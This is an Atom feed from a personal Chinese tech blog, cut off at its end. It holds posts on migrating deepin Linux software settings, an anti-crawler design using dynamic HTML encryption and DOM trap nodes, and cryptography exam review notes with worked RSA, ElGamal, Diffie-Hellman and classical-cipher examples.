<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>夏日 の blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://zssblog.top/"/>
  <updated>2020-09-24T14:50:19.254Z</updated>
  <id>http://zssblog.top/</id>
  
  <author>
    <name>夏日</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>deepin迁移系统</title>
    <link href="http://zssblog.top/2020/09/24/deepin%E8%BF%81%E7%A7%BB%E7%B3%BB%E7%BB%9F/"/>
    <id>http://zssblog.top/2020/09/24/deepin%E8%BF%81%E7%A7%BB%E7%B3%BB%E7%BB%9F/</id>
    <published>2020-09-24T10:45:00.000Z</published>
    <updated>2020-09-24T14:50:19.254Z</updated>
    
    <content type="html"><![CDATA[<hr><h1 id="xie-zai-qian-mian">写在前面</h1><p>因为实验室电脑重装了deepin系统，想把笔记本上备份下直接恢复到实验室台式机上，但是数据恢复了，启动项也覆盖了，整了一两天也没整好，卒。</p><p>后尝试把用户目录下的.config文件夹下软件配置直接copy过来发现可行，这样不用再配置软件了。</p><p>本篇文章仅为个人笔记，方便日后重装系统免去配置软件等步骤。</p><h1 id="qian-yi-ju-ti-cao-zuo">迁移具体操作</h1><blockquote><p>进行数据迁移前建议备份下原文件或者用timeshift备份下系统</p></blockquote><p>个人安装的软件一般在opt目录下，把这些软件直接copy到台式机上的opt目录下，如sublime_text</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/5dd31e01b012c465c92c2adcfb1bb074.png"  alt="image-20200920112036363"></p><p>然后把笔记本下的.config目录下的sublime对应的文件夹copy到台式机上对应文件夹即可</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/7127f51005fd5ae1256545151abee587.png"  alt="image-20200920112109178"></p><p>然后我们打开sublime，会惊奇的发现下载的插件还有配置什么的都还在</p><blockquote><p>注意在opt目录下的软件需要先创建个快捷图标(y=用桌面文件创建工具即可)</p></blockquote><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/ae9bffee4bbeaf6156825c060ebbb0ed.png"  alt="image-20200920112446748"></p><p>其他软件同理，只需把.config下文件copy过来即可，注意copy过来之前不要打开软件否则可能会覆盖你copy过来的文件导致打开软件还需要配置</p><h1 id="deepin-qi-ta-pei-zhi">deepin其它配置</h1><p>安装好deepin后还需要很多配置</p><p>1.首先在设置里更新下系统然后把智能镜像源切换成国内的源</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/dce0a17cef5e42ee5712ae8bce48882e.png"  alt="image-20200920112804733"></p><p>2.把Windows下的C:\Windows\Fonts文件夹复制到deepin下。打开deepin字体安装器，直接把Fonts文件夹拖进去即可。然后去设置里更改下字体</p><p><img src="/" class="lazyload" data-src="https://img-blog.csdnimg.cn/img_convert/74567fb7803add9ec6ff04056712b30b.png"  alt="image-20200920113329172"></p><p>3.由于经常要为一些可执行文件创建桌面图标，安装下一个桌面文件创建软件。<a href="https://blog.csdn.net/zss192/article/details/104427330" target="_blank" rel="noopener">点我下载</a></p><p>4.谷歌浏览器登录账号同步即可。若浏览器字体不清楚可以</p><ul><li>用stylus插件，<a href="https://chrome.google.com/webstore/detail/stylus/clngdbkpkpeebahjckkjfobafhncgmne?utm_source=chrome-ntp-icon" target="_blank" rel="noopener">点我下载</a>。然后下载思源黑体即可，<a href="https://userstyles.org/styles/123597/theme" target="_blank" rel="noopener">点我下载</a>。这样会强制渲染浏览器字体为思源黑体。</li><li>全部设置字体为微软雅黑（外观-&gt;自定义字体）</li></ul><p>5.普通用户使用sudo免密码：dedit /etc/sudoers 修改your_user_name ALL=(ALL) NOPASSWD: ALL</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;h1 id=&quot;xie-zai-qian-mian&quot;&gt;写在前面&lt;/h1&gt;
&lt;p&gt;因为实验室电脑重装了deepin系统，想把笔记本上备份下直接恢复到实验室台式机上，但是数据恢复了，启动项也覆盖了，整了一两天也没整好，卒。&lt;/p&gt;
&lt;p&gt;后尝试把用户目录下的.config文
      
    
    </summary>
    
    
      <category term="Linux" scheme="http://zssblog.top/categories/Linux/"/>
    
    
      <category term="Linux" scheme="http://zssblog.top/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>互联网+反爬虫核心技术说明</title>
    <link href="http://zssblog.top/2020/07/03/%E4%BA%92%E8%81%94%E7%BD%91-%E5%8F%8D%E7%88%AC%E8%99%AB%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF%E8%AF%B4%E6%98%8E/"/>
    <id>http://zssblog.top/2020/07/03/%E4%BA%92%E8%81%94%E7%BD%91-%E5%8F%8D%E7%88%AC%E8%99%AB%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF%E8%AF%B4%E6%98%8E/</id>
    <published>2020-07-03T04:56:00.000Z</published>
    <updated>2020-07-04T03:08:35.263Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xian-you-pa-chong-que-dian">现有爬虫缺点</h1><p>现有反爬虫技术缺点(根据这个图片手动画个这样的图)</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200703123131973.png"  alt="image-20200703123131973"></p><p>现有的网络爬虫检测和防御方案，通过检测用户(包括网络爬虫)的访问频率,行为模式等,进行对恶意网络爬虫的识别。<br>这种方案的弊端是，网络爬虫的编写者有足够的时间和精力，针对静态的HTML(而咱们的项目就是让静态页面变成动态的)。</p><h1 id="ben-xiang-mu-shi-xian-guo-cheng-ji-you-dian">本项目实现过程及优点</h1><p>Web页面动态化，即改变HTML及其他静态资源原本的静态、单一、确定等特性通过动态加密和动态陷阱技术将静态资源进行动态化处理，消除因静态所带来的易匹配、易批量化请求的缺陷。另外本项目采用自适应调整动态频率降低因动态化带来的系统开销。</p><blockquote><p>简单来说就是用动态加密和动态陷阱进行动态处理，为避免过度消耗系统资源用自适应调整动态频率来调整</p></blockquote><h2 id="e-yi-pa-chong-zhu-dong-fang-yu-liu-cheng-tu" id="恶意爬虫主动防御流程图"><a class="header-anchor" href="#恶意爬虫主动防御流程图">¶</a>恶意爬虫主动防御流程图</h2><blockquote><p>把这个流程图加到PPT中(不要放图片，手动画一个流程图)</p></blockquote><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200704103929986.png"  alt="image-20200704103929986"></p><h2 id="dong-tai-jia-mi" id="动态加密"><a class="header-anchor" href="#动态加密">¶</a>动态加密</h2><p>用动态加密的方式对静态属性进行动态加密处理，使得每次响应的HTML代码中原有的HTML静态属性发生动态变化，且具有不可逆向和不可预测性，增大了爬虫编写过程前期分析阶段的难度。从而主动地将恶意爬出限制在分析阶段，有效的保障Web应用的安全性和服务质量。</p><h3 id="shi-xian-guo-cheng" id="实现过程"><a class="header-anchor" href="#实现过程">¶</a>实现过程</h3><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200704102711974.png"  alt="image-20200704102711974"></p><p>(1)：首先，抽取 HTML 页面中待加密的标签，记为SA；为了能够动态的进行加密，选择密钥串 S 平均切分，得到 SFront 和 SLast</p><p>(2)：利用随机数生成算法生成随机序列 R ，替换原密钥串中的后半部分SLast ，得到 S *，即为动态密钥</p><p>(3)：使用 Rijndael 加密算法对静态标签 SA 进行加密得到密文的后半部分 DLast</p><p>(4)：随机序列R和和密钥串S后半部分SLast 进行异或得到密文的前半部分 DFront</p><p>(5)：组合DFront 和 DLast 得到加密后的动态化 HTML 标签</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200704103302496.png"  alt="image-20200704103302496"></p><p>(6)：发生请求时，先提取 HTML 代码中的动态化标签D ，将其平均切分得到 DFront DLast</p><p>(7)：从数据库中读取该标签所对应的密钥串 S ，平均切分得到SFront 和 SLast</p><p>(8)：DFront和和密钥串S后半部分SLast 进行异或得到随机序列 R</p><p>(9)：SFront和随机序列R组合获取动态密钥 S *</p><p>(10)：用 Rijndael 解密即可得到原来的静态 HTML标签 SA</p><h2 id="dong-tai-xian-jing" id="动态陷阱"><a class="header-anchor" href="#动态陷阱">¶</a>动态陷阱</h2><p>此外，利用动态陷阱技术，动态陷阱的目标是动态地加入隐藏 DOM 树节点，消除 DOM 树结构导致的静态路径问题，使HTML在动态加密静态属性之后动态混淆DOM层级关系从而避免利用xPath等selector方式进行精准定位。</p><blockquote><p>例如在路径 ’/html/body/div[5]/dl/dd/ul/li[7]/div[2]/div[1]/a’中添加任意节点都会改变指向当前 a节点的路径</p></blockquote><h3 id="shi-xian-guo-cheng-1" id="实现过程-v2"><a class="header-anchor" href="#实现过程-v2">¶</a>实现过程</h3><p>1.对于插入点的选取：根据设定需要防护的内容首先找到该内容所处 节点的路径，DOM 树节点的精准路径会因为该节点的先辈节点和前驱同胞节点的增减而变化，故选取插入点的方式便是在其先辈节点中进行插入或在其前面插入同胞节点。</p><p>2.对于插入内容选取：首先，插入的 DOM 节点均为 HTML 中的合法节点即可满足不影响代码正常执行；动态插入的 节点中不包含内容且不与已有节点产生冲突即可满足不影响页面显示；满足以上两点的 tag 类型可以自行构造，因此满足不可预测性。</p><p>3.基于梅森旋转算法的插入机制：插入机制通过随机选择的方式从插入点和插入内容中进行选取，为了能够提升随机性和不可预测 性，需要对插入位置和插入内容进行随机选择，用DOM树的层级结构的相对位置，消除 DOM 路径的 单一性和可匹配性。</p><h2 id="zi-gua-ying-diao-zheng-dong-tai-pin-lu" id="自适应调整动态频率"><a class="header-anchor" href="#自适应调整动态频率">¶</a>自适应调整动态频率</h2><p>动态的改变就会给系统带来负面影响，影响系统的响应时间，因此选取一个合理的跳变策略降低因动态化带来的系统开销。</p><h3 id="shi-xian-guo-cheng-2" id="实现过程-v3"><a class="header-anchor" href="#实现过程-v3">¶</a>实现过程</h3><p>定义系统中当前剩余性能值为 curState，计算方法如下，以此来衡量当前系统整体剩余能力值，考虑到实际情况，当其中任一参数值小于0.1 时，代表该项指标已经过载，此时 curState 整体值应该小于 0.1，其中α=0.5，β=0.3 以及γ=0.2</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200704110031794.png"  alt="image-20200704110031794"></p><p>如式 (13) 所示，定义当前的跳变频率为hopFrequency,当系统性能现在状态值小于 0.35 时，频率可以动态增加；当目前系统状态值处于 0.25~ 0.35 时，此时为最佳状态，这时应该保持现有的变换频率；当目前系统性能值小于 0.2时，此时系统状态处于饱和状态，应该动态的减慢跳变的频率</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;xian-you-pa-chong-que-dian&quot;&gt;现有爬虫缺点&lt;/h1&gt;
&lt;p&gt;现有反爬虫技术缺点(根据这个图片手动画个这样的图)&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/&quot; class=&quot;lazyload&quot; data-src=&quot;https://cdn.jsde
      
    
    </summary>
    
    
      <category term="日常办公" scheme="http://zssblog.top/categories/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
    
      <category term="日常办公" scheme="http://zssblog.top/tags/%E6%97%A5%E5%B8%B8%E5%8A%9E%E5%85%AC/"/>
    
  </entry>
  
  <entry>
    <title>密码学题型速记</title>
    <link href="http://zssblog.top/2020/06/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E9%A2%98%E5%9E%8B%E9%80%9F%E8%AE%B0/"/>
    <id>http://zssblog.top/2020/06/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E9%A2%98%E5%9E%8B%E9%80%9F%E8%AE%B0/</id>
    <published>2020-06-28T09:36:00.000Z</published>
    <updated>2020-06-28T09:37:17.027Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xie-zai-qian-mian">写在前面</h1><p>本篇文章根据老师给的重点有针对性的快速复习。</p><p>对于河南大学的学弟学妹们，如果你们任课老师是袁老师的话，他会给复习要点，跟着复习要点有针对性的复习就行。</p><h1 id="pan-duan-ti-2-5">判断题2*5</h1><ul><li>题型太杂无法预测，可能考PPT黄色或黑色部分的内容</li></ul><h1 id="jian-da-ti-5-6">简答题5*6</h1><h2 id="fan-wei" id="范围"><a class="header-anchor" href="#范围">¶</a>范围</h2><ul><li>清楚信息安全专业学习密码学的原因</li><li>掌握流密码的基本思想</li><li>理解分组密码的CBC工作模式，能够画出该模式的加密示意图</li><li>理解弱单向函数与强单向函数的定义</li><li>能够知道5种密码学新方向或新技术(写出来5个就行)</li><li>第六个可能是标黄的也可能是标黑的</li></ul><h2 id="xi-ti" id="习题"><a class="header-anchor" href="#习题">¶</a>习题</h2><p>1.==清楚信息安全专业学习密码学的原因==   （非标准答案）（==必考！==）</p><p>答：信息在社会中的地位和作用越来越重要，而其安全也愈发重要，而密码学是保障信息安全的核心技术。密码学已渗透到我们日常生活各个方面。比如公钥密码技术用于数字签名，认证服务，没有它，常用的网上支付系统就无法存在。还有一些重要的用户登录系统，手机通信中的信息加密等也依赖密码学。信息安全专业学习密码学有利于学生了解如何保障信息的安全和基本思想的建立。</p><p>2.==流密码的基本思想==：  (==必考！==)</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200616215215527.png"  alt="image-20200616215215527"></p><p>3.==CBC工作模式为==：它一次对一个明文分组(8个字节一组)加密，每次加密使用同一密钥，加密算法的输入是当前明文分组和前一次密文分组的异或，因此加密算法的输入不会显示出这次的明文分组之间的固定关系，所以重复的明文分组不会在密文中暴露出这种重复关系                   （==必须背会！==）</p><p>==CBC模式加解密示意图== （==必考！==）</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200614163017246.png"  alt="image-20200614163017246" style="height:450px" /><p>加密: C<sub>i</sub>= E<sub>k</sub>[P<sub>i</sub>⊕C<sub>i-1</sub>] (可认为C<sub>0</sub>=IV)         解密:P<sub>i</sub>= D<sub>K</sub>[C<sub>i</sub>]⊕C<sub>i-1</sub></p><blockquote><p>IV初始向量与第一个明文分组异或，应像密钥一样被保护。该模式能够获得保密性也可认证，适合加密64比特的消息</p></blockquote><p>4.==弱单向函数和强单向函数==            （==必考！==）</p><p>单向函数：已知h，求使得H(x)=h的x在计算上是不可行的。</p><p>已知x，找出y (y≠x) 使得H(y)=H(x)在计算上是不可行的，若单向函数满足这种性质则称其为弱单向函数            （==必须会背！==）</p><p>找出任意两个不同的输入x、y，使得H(x)=H(y)在计算上是不可行的，若单向函数满足这种性质则称其为强单向函数                   （==必须会背！==）</p><blockquote><p>已知一个另找一个使得H函数相等是弱单向，任意给倆使其H函数相等是强单向（看谁单的很）</p></blockquote><p>5.写出5个密码学新方向或新技术</p><p>身份基加密(IBE)、属性基加密(ABE)、全同态加密、动态加密、可搜索加密</p><h1 id="ji-suan-ti-10-4">计算题10*4</h1><h2 id="fan-wei-1" id="范围-v2"><a class="header-anchor" href="#范围-v2">¶</a>范围</h2><ul><li>能够根据给定的一个字节a，给定的AES仿射变换(*)和不可约多项式m(x)，求出字节a在AES S盒中字节代替变换的结果(需要自己求逆,自己试试就出来了)</li><li>能够根据RSA算法进行加密与解密计算<ul><li>a*b (mod q) = a (mod q) * b (mod q)</li><li>φ(n) = φ§*φ(q) = (p-1)*(q-1)</li></ul></li><li>能够使用ElGamal数字签名体制，进行签名与验证计算<ul><li>a*b (mod q) = a (mod q) * b (mod q)</li></ul></li><li>能够基于D-H密钥交换协议计算生成通信双方的共享密钥</li></ul><h2 id="xi-ti-1" id="习题-v2"><a class="header-anchor" href="#习题-v2">¶</a>习题</h2><p>1.==对字节a=1011  0110字节替代变换，设a的逆为a<sup>-1</sup>==                 （ ==必考！==）</p><p>答：先求a的逆，再用仿射变换即可</p><p>:one: 由a得(x<sup>7</sup>+x<sup>5</sup>+x<sup>4</sup>+x<sup>2</sup>+x)a<sup>-1</sup> ≡ 1(mod x<sup>8</sup>+x<sup>4</sup>+x<sup>3</sup>+x+1)</p><p>所以a<sup>-1</sup>=x<sup>6</sup>+x<sup>5</sup>+x<sup>4</sup>+x<sup>3</sup>             即0111 1000     （二进制对应位数有1就代表有x的那一次方）</p><blockquote><p>根据老师给的考试要点，仿射变换和m(x)题目会给出，a的逆试试就出来了</p><p>a*a<sup>-1</sup>即1011 0110*0111 1000 = 1101 0110 0100 00</p><p>a*a<sup>-1</sup> mod m(x)：1101 0110 0100 00 % 1000 1101 1(m(x)) = 1</p><p>考试时试试1的二进制，2的二进制，3的二进制，和a相乘%m(x)看是否为1</p></blockquote><p>:two: 使用仿射变换   （注意要用a的逆而且注意x的顺序从下往上读）</p><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/QQ%E5%9B%BE%E7%89%8720200614210639.jpg"  alt=""></p><blockquote><p>注意是模2加，即只有0和1</p></blockquote><p>即(0100 1110)<sub>2</sub>=(4E)<sub>16</sub>                 注意也是从下开始读  因为最下面的是字节高位即最前面的01…</p><p>2.1 ==RSA加密体制中，接收方的公开钥是(e,n)=(5,35)，接收到的密文是C=10，求明文M== （==必考！==）</p><p>答：（    m ≡ c<sup>d</sup> mod n         所以得先算出d  -----&gt; d*e ≡ 1 mod φ(n)  ）</p><p>n=35             所以 p=5，q=7</p><p>φ(35) = (p-1)*(q-1) =4*6=24</p><p>因为 d*e ≡ 1 mod φ(n)   所以d=5      （这个到时候一个一个试就行）</p><p>m ≡ c<sup>d</sup> mod n ≡ 10<sup>5</sup> mod 35 ≡ 5          （注意不是等号）</p><blockquote><p>考试可求出明文再反推密文试下看看密文是不是10</p></blockquote><p>2.2 ==假设明文m=5，e=7，p=11，q=13，给出RSA的加密解密过程==     （==必考！==）</p><p>答：n=p*q=11*13=143           φ(143) = (p-1)*(q-1) = 10*12=120</p><p>因为d*e ≡ 1 mod φ(n)  即d*7 ≡ 1 mod 120   所以 d=103</p><p>加密：c ≡ m<sup>e</sup> mod n  ≡ 5<sup>7</sup> ≡ 47 mod 143</p><p>解密：m ≡ c<sup>d</sup> mod n  ≡ 47<sup>103</sup> ≡ 5 mod 143</p><p>3.ElGamal签名体制中，假设p=19，g=13。签名者A的私钥为x = 10，试计算公钥。设消息M=15，k=11，求签名过程并验证。  (==必考！==)</p><p>答：公钥：y ≡ g<sup>x</sup> mod p ≡ 13<sup>10</sup> mod 19 = 6</p><p>签名：r ≡ g<sup>k</sup>  (mod p) ≡ 13<sup>11</sup> mod 19 =2</p><p>s ≡ (H(m)-xr)k<sup>-1</sup> (mod p-1) ≡ (m-xr)k<sup>-1</sup> (mod p-1) ≡ (15-10*2)*11<sup>-1</sup> mod 18 = 11</p><p>所以(r,s)=(2,11)</p><p>验证：y<sup>r</sup>r<sup>s</sup> ≡ 6<sup>2</sup>*2<sup>11</sup> mod 19 ≡ 8 ≡ g<sup>m</sup> (mod p) ≡ 13<sup>15</sup> ≡ 8 mod 19</p><blockquote><p>根据老师的重点中给出的a*b (mod q) = a (mod q) * b (mod q)应该是用在比如这题求6<sup>2</sup>*2<sup>11</sup> mod 19就等同于求6<sup>2</sup> mod 19 * 2<sup>11</sup> mod 19 ≡ 17 *15 ≡ 8 mod 19</p></blockquote><p>求上面的11<sup>-1</sup>mod 18：</p><p>11*x ≡ 1 mod 18可算出x=5，而11*11<sup>-1</sup> ≡ 1 mod 18 即11<sup>-1</sup> ≡ 5 mod 18</p><p>4.在Diffie- Hellman密钥交换过程中，设大素数p=11,a=2是p的本原根。  （==必考！==）<br>(1) 用户A的公开钥Y<sub>A</sub>=9,求其秘密钥XA。<br>(2)设用户B的公开钥Y<sub>B</sub>=3,求A和B的共享密钥K。</p><p>答：:one: Y<sub>A</sub>=a<sup>XA</sup> mod p = a<sup>XA</sup> mod p 即 9=2<sup>XA</sup> mod 11   所以 X<sub>A</sub>=6  (考试时一个一个试就行)</p><p>:two: K=Y<sub>B</sub><sup>XA</sup> mod p = 3<sup>6</sup> mod 11 =3</p><h1 id="lun-shu-ti-1-20-ren-xuan-yi-ge-ji-ke">论述题1*20  （任选一个即可）</h1><ul><li>介绍一种密码学协议研究与应用动态。</li><li>提出一种安全应用场景，试设计出相应的密码协议实现安全应用。</li><li>介绍一种安全应用场景，分析该安全场景应用了哪些密码技术，并简述如何保障了安全性。</li></ul><p><a href="https://baike.baidu.com/item/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E" target="_blank" rel="noopener">https://baike.baidu.com/item/%E9%9B%B6%E7%9F%A5%E8%AF%86%E8%AF%81%E6%98%8E</a></p><h2 id="ling-zhi-shi-zheng-ming" id="零知识证明"><a class="header-anchor" href="#零知识证明">¶</a>零知识证明</h2><h3 id="jie-shao" id="介绍"><a class="header-anchor" href="#介绍">¶</a>介绍</h3><p>零知识证明是在20世纪80年代初提出的。它指的是证明者能够在不向验证者提供任何有用的信息的情况下，使验证者相信某个论断是正确的。零知识证明实质上是一种涉及两方或更多方的协议，即两方或更多方完成一项任务所需采取的一系列步骤。证明者向验证者证明并使其相信自己知道或拥有某一消息，但证明过程不能向验证者泄漏任何关于被证明消息的信息。</p><blockquote><p>要是太多这段可省略</p><p>零知识证明起源于最小泄露证明。设P表示掌握某些信息，并希望证实这一事实的实体，设V是证明这一事实的实体。假如某个协议向V证明P的确掌握某些信息，但V无法推断出这些信息是什么，我们称P实现了最小泄露证明。不仅如此，如果V除了知道P能够证明某一事实外，不能够得到其他任何知识，我们称P实现了零知识证明，相应的协议称作零知识协议。</p></blockquote><p>例如，A要向B证明自己拥有某个房间的钥匙，假设该房间只能用钥匙打开锁，而其他任何方法都打不开。这时有2个方法：</p><p>①A把钥匙出示给B，B用这把钥匙打开该房间的锁，从而证明A拥有该房间的正确的钥匙。</p><p>②B确定该房间内有某一物体，A用自己拥有的钥匙打开该房间的门，然后把物体拿出来出示给B，从而证明自己确实拥有该房间的钥匙。</p><p>后面的②方法属于零知识证明。它的好处在于，在整个证明的过程中，B始终不能看到钥匙的样子，从而避免了钥匙的泄露。</p><h3 id="ying-yong-dong-tai" id="应用动态"><a class="header-anchor" href="#应用动态">¶</a>应用动态</h3><p>零知识证明在区块链里的应用非常广泛。最早使用零知识证明技术的区块链叫做 Zcash，这是许多零知识证明的做法之一，也是最有名的一个。V神就曾表示称，零知识证明能够被应用于以太坊区块链上几乎所有的场景。</p><p>相对于ZCash来说，比特币的转账并不是完全匿名的，只要知道了一个比特币地址，任何人都可以通过这个网站，查到这个地址的所有“消费”行为。比如给谁转了账，又从谁那里收到过转账，在以区块链技术为基础的“账本”上都详细地记录着。</p><p>例如A有3个BTC，要给B转账1个BTC，那么在账本上就会记录着：A转出了两笔BTC，一笔为1BTC，转给了B；另一笔为2BTC，转给了自己。</p><p>那么利用了“零知识证明”的ZCash是怎么做到的所谓匿名呢？</p><p>ZCash的代币为ZEC。同样假设A有3个ZEC，要给B转账1个ZEC。</p><p>首先，A会将自己的1个ZEC分成若干份随机投入一系列的“混合容器”中，指定接收方B的地址，同时混入的时候还有其他交易方输出的若干份ZEC。这些ZEC又被混合容器随机拆分，再从这些被拆分生成的所有的ZEC中取出合计为1ZEC的若干份，转移到B的地址中，同时在发送的时间上也可以设置一定的延迟。</p><p>其中的“混合容器”，就是一条“公有链”。经过这条公有链一系列的“混币”过程，就使得包括交易地址和具体金额在内的交易信息变得无从考证了。</p><p>零知识证明技术虽然会给区块链带来更强的匿名性，但同时会引起大量的监管问题，这是零知识证明技术无法回避的一个问题。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;xie-zai-qian-mian&quot;&gt;写在前面&lt;/h1&gt;
&lt;p&gt;本篇文章根据老师给的重点有针对性的快速复习。&lt;/p&gt;
&lt;p&gt;对于河南大学的学弟学妹们，如果你们任课老师是袁老师的话，他会给复习要点，跟着复习要点有针对性的复习就行。&lt;/p&gt;
&lt;h1 id=&quot;pan-d
      
    
    </summary>
    
    
      <category term="计算机专业课" scheme="http://zssblog.top/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
    
      <category term="计算机专业课" scheme="http://zssblog.top/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%93%E4%B8%9A%E8%AF%BE/"/>
    
  </entry>
  
  <entry>
    <title>现代密码学期末总结</title>
    <link href="http://zssblog.top/2020/06/14/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E6%9C%9F%E6%9C%AB%E6%80%BB%E7%BB%93/"/>
    <id>http://zssblog.top/2020/06/14/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E6%9C%9F%E6%9C%AB%E6%80%BB%E7%BB%93/</id>
    <published>2020-06-14T15:33:00.000Z</published>
    <updated>2020-06-28T09:40:59.194Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xie-zai-qian-mian">写在前面</h1><p>由于老师后来给画了重点，本篇博客后半部分主要记录的是老师画的重点。个人复习使用，仅供参考</p><p>对于河南大学的学弟学妹们，如果你们任课老师是袁老师的话，他会给复习要点，跟着复习要点有针对性的复习就行。</p><h1 id="yin-yan">引言</h1><h2 id="zhi-shi-dian" id="知识点"><a class="header-anchor" href="#知识点">¶</a>知识点</h2><p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200616202612666.png"  alt="image-20200616202612666"></p><p>1.在本书中，c指密文，m指明文，E()表示加密函数，D()表示解密函数</p><p>2.仿射变换：加密和解密中a，b为秘钥  （属于单表变换）</p><p>c=E<sub>a,b</sub>(m)=am+b(mod 26)</p><p>m=D<sub>a,b</sub>(m)=a<sup>-1</sup>(c-b)(mod 26)</p><blockquote><p>注意a<sup>-1</sup>*a≡1 mod 26</p></blockquote><p>3.多表代换密码：其中A为n*n的矩阵，n等于几代表明文每几个分成一组。一般N为26。</p><p>C<sub>i</sub>≡AM<sub>i</sub>+B(mod N)，i=1,2,3…</p><p>M<sub>i</sub>≡A<sup>-1</sup>(C<sub>i</sub>-B)(mod N)，i=1,2,3…</p><p>4.人为攻击分为</p><ul><li>被动攻击       就是窃听，是对系统保密性的攻击<ul><li>获取信息的内容</li><li>业务流分析     敌收无法获得消息但可能获得通信双方身份、次数…</li></ul></li><li>主动攻击       对数据流的篡改或产生假数据流<ul><li>中断      如破坏硬件、系统是对系统可用性的攻击</li><li>篡改      修改数据是对系统完整性的攻击</li><li>伪造      如插入伪造消息或记录，是对系统真实性的攻击</li></ul></li></ul><blockquote><p>被动攻击不改变消息而主动攻击改变消息内容</p><p>抵抗被动攻击：预防                抵抗主动攻击：检测修复</p></blockquote><p>5.密码算法的安全性包括哪两类？？(暂时没找到)</p><p>6.密钥管理：密钥产生、分配、存储、销毁等问题</p><p>7.密码体质从原理上可分为两类</p><ul><li>对称(单钥)密码体制             （可用于数据加密和消息认证）<ul><li>流密码                             逐位加密</li><li>分组密码                         消息分组，逐组加密</li></ul></li><li>非对称(双钥)密码体制            两密钥，一公开一私密</li></ul><p>8.对密码系统的攻击按攻击者可获取的信息量可分为</p><ul><li>唯密文攻击                           仅知道一些密文</li><li>已知明文攻击                       知道一些密文和相应的明文</li><li>选择明文攻击                       密码分析者可以选择一些明文并得到相应的密文</li><li>选择密文攻击                       密码分析者可以选择一些密文，并得到相应的明文</li></ul><blockquote><p>以上攻击都建立在已知算法的基础之上，且攻击强度依次增加</p></blockquote><p>9.单向陷门函数就是有一个陷门的一类特殊单向函数。</p><p>若y=f(x)，已知x很容易计算y，但已知y很难计算x（单向性）。特别的是存在一个z使得知道了z那么就很容易由y计算出x，那么z则称为陷门（有陷门也称后门）</p><p>10.加密算法满足下列两点则认为是计算上安全的</p><ul><li>破译密文的代价超过被加密信息的价值</li><li>破译密文所花的时间超过信息的有用期</li></ul><p>11.攻击密码体制的常用方法</p><ul><li>穷举攻击                             （解决方法 : 增大密钥量）</li><li>统计分析攻击                     （解决方法：使明文的统计特性与密文的统计特性不一样）</li><li>数学分析攻击                     （解决方法：选用足够复杂的加密算法）</li></ul><p>12.密钥体制组成部分（加密系统的五元组）：明文，密文，密钥，加密算法，解密算法。</p><p>13.一个好密钥体制至少应满足的两个条件：</p><ul><li>已知明文和加密密钥计算密文容易，已知密文和解密密钥计算明文容易</li><li>在不知解密密钥的情况下，不可能由密文 c 推出明文</li></ul><h2 id="xi-ti" id="习题"><a class="header-anchor" href="#习题">¶</a>习题</h2><p>1.设由仿射变换对一个明文加密得到的密文为edsgickxhuklzveqzvkxwkzukvcuh，又已知明文的前两个字符是“if&quot;，对该密文解密。</p><p>答：e=4  d=3  i=8   f=5    （26个字母下标从0开始）E<sub>a,b</sub>(m)=am+b(mod 26)</p><p>E(i)=e，4≡8*a+b(mod 26)</p><p>E(f)=d，3≡5*a+b(mod 26)</p><p>由上述两个式子可推出a=9，b=10，所以m=9<sup>-1</sup>(c-10)(mod 26)</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@latest/images/image-20200609204054393.png"  alt="image-20200609204054393" style="zoom:80%;" /><p>2.设多表代换密码C≡AM<sub>i</sub>+ B(mod26)中，A是2X2矩阵，B是0矩阵，又知明文“dont”被加密为“elni”，求矩阵A。</p><img src="/" class="lazyload" data-src="https://cdn.jsdelivr.net/gh/zss192/Typora-notes@master/images/image-20200609205229494.png"  alt="image-20200609205229494" style="zoom:67%;" /><blockquote><p>注意矩阵相乘的结果要模26，上式求b的时候算得125b=13，其实应是125b≡13(mod 26)，即为21b≡13(mod 26)，解得b=13，其他类似</p></blockquote><h1 